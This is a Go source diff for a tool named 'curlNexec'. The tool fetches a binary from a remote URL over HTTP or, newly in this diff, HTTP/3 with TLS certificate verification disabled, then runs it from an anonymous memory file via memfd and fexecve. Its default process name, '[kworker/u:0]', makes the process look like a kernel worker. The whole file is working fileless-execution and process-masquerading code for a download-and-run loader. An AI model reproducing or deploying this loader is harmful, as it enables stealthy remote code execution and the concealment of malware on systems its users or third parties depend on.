@@ -1,14 +1,20 @@
 package main
 
 import (
+	"bytes"
+	"crypto/tls"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
 	"os"
+	"sync"
 	"syscall"
 
 	"github.com/justincormack/go-memfd"
+	"github.com/lucas-clemente/quic-go"
+	"github.com/lucas-clemente/quic-go/http3"
 	"github.com/spf13/cobra"
 )
 
@@ -18,6 +24,7 @@ func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
 	return err
 }
 
+//Retrieve Binary from Remote using http protocol
 func GetBinaryRaw(url string) string {
 
 	resp, err := http.Get(url)
@@ -37,10 +44,53 @@ func GetBinaryRaw(url string) string {
 	return string(body)
 }
 
+//Retrieve Binary from Remote using http3 protocol (Quic)
+//Put ca.pem in current directory
+func GetBinaryRawHTTP3(url string) string {
+
+	var qconf quic.Config
+	roundTripper := &http3.RoundTripper{
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true, // To accept your self-signed certificates for example
+		},
+		QuicConfig: &qconf,
+	}
+	defer roundTripper.Close()
+	hclient := &http.Client{
+		Transport: roundTripper,
+	}
+	var binaryRawByte []byte
+	var wg sync.WaitGroup
+	wg.Add(1)
+
+	go func(addr string) {
+		rsp, err := hclient.Get(addr)
+		if err != nil {
+			log.Fatal(err)
+		}
+		//fmt.Printf("Got response for %s: %#v", addr, rsp)
+
+		body := &bytes.Buffer{}
+		_, err = io.Copy(body, rsp.Body)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		binaryRawByte = body.Bytes()
+
+		wg.Done()
+	}(url)
+
+	wg.Wait()
+	return string(binaryRawByte)
+}
+
 func main() {
 
 	//CMD CURLNEXEC
 	var name string
+	var http3 bool
+
 	var cmdCurlNexec = &cobra.Command{
 		Use:   "curlNexec [remote_url]",
 		Short: "Execute remote binary locally",
@@ -50,7 +100,12 @@ func main() {
 
 			url := args[0]
 
-			binaryRaw := GetBinaryRaw(url)
+			var binaryRaw string
+			if http3 {
+				binaryRaw = GetBinaryRawHTTP3(url) //https if you used server from example
+			} else {
+				binaryRaw = GetBinaryRaw(url)
+			}
 
 			mfd, err := memfd.Create()
 			if err != nil {
@@ -74,6 +129,7 @@ func main() {
 
 	//flag handling
 	cmdCurlNexec.PersistentFlags().StringVarP(&name, "name", "n", "[kworker/u:0]", "running process name")
+	cmdCurlNexec.PersistentFlags().BoolVarP(&http3, "http3", "Q", false, "use of HTTP3 (QUIC) protocol")
 
 	cmdCurlNexec.Execute()
 }
